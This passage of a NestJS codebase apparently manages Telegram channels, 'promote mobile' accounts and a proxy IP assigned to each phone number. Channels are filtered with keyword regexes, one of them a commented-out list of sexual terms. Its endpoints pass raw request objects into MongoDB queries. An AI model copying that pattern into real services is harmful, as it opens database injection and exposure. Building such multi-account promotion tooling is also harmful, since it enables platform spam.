//@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\nimport { PipelineStage } from 'mongoose';\n\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    const query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          // {\n          //   '$or':\n          //     [\n          //       { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n          //       { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n          //     ]\n          // },\n          {\n            '$and': [\n              {\n                title: {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n              {\n                username:\n                {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: { $ne: null },\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    try {\n\n      const pipeline: PipelineStage[] = [\n        { $match: query },\n        { $addFields: { randomField: { $rand: {} } } },\n        { $sort: { randomField: 1 as const } },\n        { $skip: skip },\n        { $limit: limit },\n        { $project: { randomField: 0 } }\n      ];\n      const result: Channel[] = await this.ChannelModel.aggregate<Channel>(pipeline).exec();\n      return result;\n    } catch (error) {\n      console.error('🔴 Aggregation Error:', error);\n      return [];\n    }\n\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\r\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\r\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\r\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('search/promote-mobile')\r\n  @ApiOperation({ summary: 'Search clients by promote mobile numbers' })\r\n  @ApiQuery({ name: 'mobile', required: true, description: 'Promote mobile number to search for' })\r\n  @ApiResponse({ status: 200, description: 'Clients with matching promote mobiles returned successfully.' })\r\n  async searchByPromoteMobile(@Query('mobile') mobile: string): Promise<{\r\n    clients: Client[];\r\n    matches: Array<{ clientId: string; mobile: string }>;\r\n    searchedMobile: string;\r\n  }> {\r\n    try {\r\n      const result = await this.clientService.enhancedSearch({ promoteMobileNumber: mobile });\r\n      return {\r\n        clients: result.clients,\r\n        matches: result.promoteMobileMatches || [],\r\n        searchedMobile: mobile\r\n      };\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('search/enhanced')\r\n  @ApiOperation({ summary: 'Enhanced search with promote mobile support' })\r\n  @ApiQuery({ name: 'promoteMobileNumber', required: false, description: 'Promote mobile number to search for' })\r\n  @ApiQuery({ name: 'hasPromoteMobiles', required: false, description: 'Filter by clients that have promote mobiles (true/false)' })\r\n  @ApiResponse({ status: 200, description: 'Enhanced search results with promote mobile context.' })\r\n  async enhancedSearch(@Query() query: any): Promise<{\r\n    clients: Client[];\r\n    searchType: string;\r\n    promoteMobileMatches?: Array<{ clientId: string; mobile: string }>;\r\n    totalResults: number;\r\n  }> {\r\n    try {\r\n      const result = await this.clientService.enhancedSearch(query);\r\n      return {\r\n        clients: result.clients,\r\n        searchType: result.searchType,\r\n        promoteMobileMatches: result.promoteMobileMatches,\r\n        totalResults: result.clients.length\r\n      };\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked() {\r\n    try {\r\n      return await this.clientService.findAllMasked();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll() {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  @Get('sync-npoint')\r\n  @ApiOperation({ summary: 'Sync clients with npoint service' })\r\n  @ApiResponse({ status: 200, description: 'Clients synchronized successfully with npoint.' })\r\n  @ApiResponse({ status: 500, description: 'Internal server error during synchronization.' })\r\n  async syncNpoint(): Promise<void> {\r\n    try {\r\n      await this.clientService.checkNpoint();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // @Get('setupClient/:clientId')\r\n  // @ApiOperation({ summary: 'SetUp Client data' })\r\n  // //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  // //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  // async setupClient(@Param('clientId') clientId: string, @Query() setupClientQueryDto: SetupClientQueryDto) {\r\n  //   this.clientService.setupClient(clientId, setupClientQueryDto);\r\n  //   return `Started Client Seup for ${clientId}`\r\n  // }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number as a promote mobile for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number as a promote mobile for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number assigned as promote mobile successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body() body: { mobileNumber: string }): Promise<Client> {\r\n    return this.clientService.addPromoteMobile(clientId, body.mobileNumber);\r\n  }\r\n\r\n  /**\r\n   * Remove a promote mobile assignment from a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a promote mobile assignment from a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Promote mobile assignment removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body() body: { mobileNumber: string }) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, body.mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // ==================== IP MANAGEMENT INTEGRATION ====================\r\n\r\n  @Get(':clientId/ip-info')\r\n  @ApiOperation({ summary: 'Get IP assignment information for a client' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ status: 200, description: 'IP information retrieved successfully' })\r\n  async getClientIpInfo(@Param('clientId') clientId: string): Promise<{\r\n      clientId: string;\r\n      mobiles: {\r\n          mainMobile?: { mobile: string; hasIp: boolean; ipAddress?: string };\r\n          promoteMobiles: { mobile: string; hasIp: boolean; ipAddress?: string }[];\r\n      };\r\n      needingAssignment: {\r\n          mainMobile?: string;\r\n          promoteMobiles: string[];\r\n      };\r\n  }> {\r\n      try {\r\n          const client = await this.clientService.findOne(clientId);\r\n          const needingAssignment = await this.clientService.getMobilesNeedingIpAssignment(clientId);\r\n          \r\n          const result = {\r\n              clientId,\r\n              mobiles: {\r\n                  mainMobile: undefined as any,\r\n                  promoteMobiles: [] as any[]\r\n              },\r\n              needingAssignment\r\n          };\r\n\r\n          // Get main mobile info\r\n          if (client.mobile) {\r\n              const hasIp = await this.clientService.hasMobileAssignedIp(client.mobile);\r\n              const ipAddress = hasIp ? await this.clientService.getIpForMobile(client.mobile) : undefined;\r\n              result.mobiles.mainMobile = {\r\n                  mobile: client.mobile,\r\n                  hasIp,\r\n                  ipAddress: ipAddress || undefined\r\n              };\r\n          }\r\n\r\n          // Get promote mobiles info from PromoteClient collection\r\n          const promoteMobiles = await this.clientService.getPromoteMobiles(clientId);\r\n          for (const mobile of promoteMobiles) {\r\n              const hasIp = await this.clientService.hasMobileAssignedIp(mobile);\r\n              const ipAddress = hasIp ? await this.clientService.getIpForMobile(mobile) : undefined;\r\n              result.mobiles.promoteMobiles.push({\r\n                  mobile,\r\n                  hasIp,\r\n                  ipAddress: ipAddress || undefined\r\n              });\r\n          }\r\n\r\n          return result;\r\n      } catch (error) {\r\n          throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n  }\r\n\r\n  @Get('mobile/:mobile/ip')\r\n  @ApiOperation({ summary: 'Get IP address for a specific mobile number' })\r\n  @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID for context' })\r\n  @ApiResponse({ status: 200, description: 'IP address retrieved successfully' })\r\n  async getIpForMobile(\r\n      @Param('mobile') mobile: string,\r\n      @Query('clientId') clientId?: string\r\n  ): Promise<{ mobile: string; ipAddress: string | null; hasAssignment: boolean }> {\r\n      try {\r\n          const ipAddress = await this.clientService.getIpForMobile(mobile, clientId);\r\n          return {\r\n              mobile,\r\n              ipAddress,\r\n              hasAssignment: ipAddress !== null\r\n          };\r\n      } catch (error) {\r\n          throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n  }\r\n\r\n  // ==================== IP MANAGEMENT ENDPOINTS ====================\r\n\r\n  @Post(':clientId/auto-assign-ips')\r\n  @ApiOperation({ summary: 'Auto-assign IPs to all client mobile numbers (Simplified System)' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ status: 200, description: 'IPs assigned successfully' })\r\n  @ApiResponse({ status: 400, description: 'Assignment failed' })\r\n  async autoAssignIpsToClient(@Param('clientId') clientId: string): Promise<any> {\r\n      try {\r\n          const result = await this.clientService.autoAssignIpsToClient(clientId);\r\n          return {\r\n              success: true,\r\n              message: `Auto-assigned IPs to ${result.summary.assigned}/${result.summary.totalMobiles} mobiles`,\r\n              data: result\r\n          };\r\n      } catch (error) {\r\n          throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n  }\r\n\r\n  @Get(':clientId/mobiles-needing-ips')\r\n  @ApiOperation({ summary: 'Get mobile numbers that need IP assignment' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ status: 200, description: 'Mobile numbers needing IP assignment' })\r\n  async getMobilesNeedingIpAssignment(@Param('clientId') clientId: string): Promise<{\r\n      clientId: string;\r\n      mobilesNeedingIps: {\r\n          mainMobile?: string;\r\n          promoteMobiles: string[];\r\n      };\r\n      summary: {\r\n          totalNeedingAssignment: number;\r\n          mainMobileNeedsIp: boolean;\r\n          promoteMobilesNeedingIp: number;\r\n      };\r\n  }> {\r\n      try {\r\n          const mobilesNeedingIps = await this.clientService.getMobilesNeedingIpAssignment(clientId);\r\n          const totalNeedingAssignment = (mobilesNeedingIps.mainMobile ? 1 : 0) + mobilesNeedingIps.promoteMobiles.length;\r\n          \r\n          return {\r\n              clientId,\r\n              mobilesNeedingIps,\r\n              summary: {\r\n                  totalNeedingAssignment,\r\n                  mainMobileNeedsIp: !!mobilesNeedingIps.mainMobile,\r\n                  promoteMobilesNeedingIp: mobilesNeedingIps.promoteMobiles.length\r\n              }\r\n          };\r\n      } catch (error) {\r\n          throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n  }\r\n\r\n  @Delete('mobile/:mobile/ip')\r\n  @ApiOperation({ summary: 'Release IP from a mobile number' })\r\n  @ApiParam({ name: 'mobile', description: 'Mobile number to release IP from' })\r\n  @ApiResponse({ status: 200, description: 'IP released successfully' })\r\n  async releaseIpFromMobile(@Param('mobile') mobile: string): Promise<{ success: boolean; message: string }> {\r\n      try {\r\n          return await this.clientService.releaseIpFromMobile(mobile);\r\n      } catch (error) {\r\n          throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { TimestampModule } from '../timestamps/timestamp.module';\nimport { SessionModule } from '../session-manager';\nimport { IpManagementModule } from '../ip-management/ip-management.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\nimport { PromoteClient, PromoteClientSchema } from '../promote-clients';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    MongooseModule.forFeature([{ name: PromoteClient.name, schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ArchivedClientModule),\n    forwardRef(() => SessionModule),\n    forwardRef(() => TimestampModule),\n    forwardRef(() => IpManagementModule),\n    forwardRef(() => PromoteClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService, MongooseModule]\n})\nexport class ClientModule {}\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef, Query, OnModuleDestroy } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, mapToJson, toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport { SessionService } from '../session-manager';\nimport { IpManagementService } from '../ip-management/ip-management.service';\nimport { PromoteClient, PromoteClientDocument } from '../promote-clients/schemas/promote-client.schema';\n\n/**\n * Enhanced Client Service with IP Management Integration\n * \n * This service now includes automated IP assignment for mobile numbers.\n * Each client's mobile and promote mobile numbers are automatically assigned\n * dedicated proxy IPs from the client's IP pool or global IP collection.\n */\n\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService implements OnModuleDestroy {\n    private readonly logger = new Logger(ClientService.name);\n    private clientsMap: Map<string, Client> = new Map();\n    private lastUpdateMap: Map<string, number> = new Map(); // Track last update times\n    private checkInterval: NodeJS.Timeout | null = null;\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @InjectModel(PromoteClient.name) private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        @Inject(forwardRef(() => SessionService))\n        private sessionService: SessionService,\n        @Inject(forwardRef(() => IpManagementService))\n        private ipManagementService: IpManagementService,\n        private npointSerive: NpointService\n    ) {\n        this.checkInterval = setInterval(async () => {\n            await this.refreshMap();\n            await this.checkNpoint();\n        }, 5 * 60 * 1000);\n    }\n\n    async onModuleDestroy() {\n        console.log('Module is being Destroyed, Disconnecting all clients');\n        if (this.checkInterval) {\n            clearInterval(this.checkInterval);\n        }\n        await connectionManager.handleShutdown();\n    }\n\n    async 